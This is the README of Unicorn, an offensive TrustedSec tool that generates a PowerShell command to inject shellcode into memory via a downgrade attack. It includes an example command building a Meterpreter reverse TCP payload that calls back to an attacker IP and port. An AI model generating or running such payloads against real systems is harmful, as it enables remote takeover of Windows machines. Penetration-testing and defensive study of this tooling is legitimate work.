unicorn
=======

Unicorn is a simple tool for using a PowerShell downgrade attack and inject shellcode straight into memory. Based on Matthew Graeber's powershell attacks and the powershell bypass technique presented by David Kennedy (TrustedSec) and Josh Kelly at Defcon 18.

Usage is simple, just run Unicorn (ensure Metasploit is installed and in the right path) and unicorn will automatically generate a powershell command that you need to simply cut and paste the powershell code into a command line window or through a payload delivery system.

root@bt:~/Desktop# python unicorn.py 

              ,_
                 _  `\  )\  ,
                 `\|  \/ |_/\  
       .-. ,    _/  `   '     |/\
       _> \|\,_'> ______        <__,
      `\      ,`'`      `'.       /__  ,
       / _   /)`           ',       <_/|
      `\/ \,; '     ,        \        /_,
        )   | /|     |        |       ` /
            | b/    /    ;    /       .'
            |    _.'|   ;     |      /__,
            |    /  | .'      |        /
            |, _ \  |         |     _.'
             \| 7/  / '.. .'   \   /_ ,     ,_   ,
                `  ;            |    /       |`\ /\
                   |            \  <'     ,_ \  Y |/\
          .-.      |             \-'       >`\| `   <__,
         (.-.`'--''\        ..    \        '-.        / ,
         /   `'---'''`.   `    `'. '.         \     .'_/|
         \  ,_'-.._.                 '.        \    `' _/
          \ \`""-._                   '.       ;     <   _,
           \ \\__   `-;-'                 '.    |      \_//
            \ \ _`,    \                    \  .'        <
             \ /   \    \                    \/       ;.-'`
              '-==='     '.        ;          ;      <__,
                           `'.    .`       ,  |-.  ,__.'
                              `'-.       ,;'  ;  '.\
                               /`      .;;'  ;     `
                             /`           _.'

                            |       _.--'`
                             \    (`(
                              \    \ \
                               \    '.'.
                              .` ,.  )  )
                           .'`. '_.-'.-'
                      _,-'` _.-'`_.-`
                    .'  \_.'`\.-`
                    '---` `--`

Unicorn is a PowerShell injection tool utilizing Matthew Graebers attack and expanded to automatically downgrade the process if a 64 bit platform is detected. This is useful in order to ensure that we can deliver a payload with just one set of shellcode instructions. This will work on any version of Windows with PowerShell installed. Simply copy and paste the output and wait for the shells.

Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)

Happy Unicorns.


Usage: python unicorn.py payload reverse_ipaddr port
Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443
